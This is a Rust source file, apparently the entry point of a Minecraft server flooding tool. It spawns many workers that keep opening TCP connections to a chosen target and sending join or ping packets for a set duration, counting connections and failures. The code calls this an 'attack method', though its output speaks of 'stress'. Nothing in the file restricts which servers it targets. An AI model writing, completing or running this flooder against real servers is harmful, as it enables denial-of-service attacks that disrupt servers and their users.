use std::net::SocketAddrV4;
use std::process::exit;
use std::time::Instant;
use std::{sync::atomic::AtomicU64, time::Duration};
use std::{sync::atomic::Ordering, sync::Arc};

use clap::Parser;
use ez_colorize::ColorizeDisplay;
use tokio::time::sleep;

use rust_mc_proto_tokio::MCConnTcp;

use crate::counter::write_stats;
use crate::duration::parse_duration_as_secs;
use crate::method_join::send_join;
use crate::method_ping::send_ping;
use crate::methods::{parse_method, AttackMethod};
use crate::resolver::{parse_hostname, parse_target};
mod counter;
mod mc_packet_utils;
mod method_join;
mod method_ping;
mod methods;
mod resolver;
#[derive(Debug, Parser)]
struct Flags {
    target: String,
    workers: u32,
    duration: String,
    method: String,
}
mod duration;
#[tokio::main]
async fn main() {
    let args = Flags::parse();
    let start_time = Instant::now();
    let (duration_secs, parsed_duration) = parse_duration_as_secs(args.duration);
    let target = parse_target(args.target.as_str(), 25565).await.unwrap();
    let hostname = Arc::new(parse_hostname(args.target.as_str()));
    let method = Arc::new(parse_method(args.method.as_str()));

    println!("Running stress for {}", parsed_duration.red());
    println!(
        "Resolved target {} {} {}",
        args.target.green(),
        String::from("=").yellow(),
        target.cyan(),
    );
    print!("\n\n\n\n\n");
    let cps = Arc::new(AtomicU64::new(0));
    let failures = Arc::new(AtomicU64::new(0));
    unsafe {
        tokio::spawn(write_stats(cps.clone(), failures.clone()));
    }

    let workers = args.workers;

    for _ in 0..workers {
        let hostname = hostname.clone();
        let connections = cps.clone();
        let failures = failures.clone();
        let method = method.clone();
        tokio::spawn(async move {
            worker_loop(connections, failures, &target, hostname.as_str(), method).await;
        });
    }
    tokio::spawn(async move {
        loop {
            sleep(Duration::from_millis(20)).await;
            if start_time.elapsed().as_secs() > duration_secs {
                exit(0);
            }
        }
    });

    tokio::signal::ctrl_c()
        .await
        .expect("Couldn't wait for ctrl c");
}

async fn worker_loop(
    cps: Arc<AtomicU64>,
    failures: Arc<AtomicU64>,
    target: &SocketAddrV4,
    hostname: &str,
    method: Arc<AttackMethod>,
) {
    loop {
        let stream = match tokio::net::TcpStream::connect(target).await {
            Ok(value) => value,
            Err(_) => {
                failures.fetch_add(1, Ordering::Relaxed);
                continue;
            }
        };
        let mut conn = MCConnTcp::new(stream);
        match *method {
            AttackMethod::Join => send_join(&mut conn, &target.port(), hostname).await,
            AttackMethod::Ping => send_ping(&mut conn, &target.port(), hostname).await,
        }
        cps.fetch_add(1, Ordering::Relaxed);
    }
}
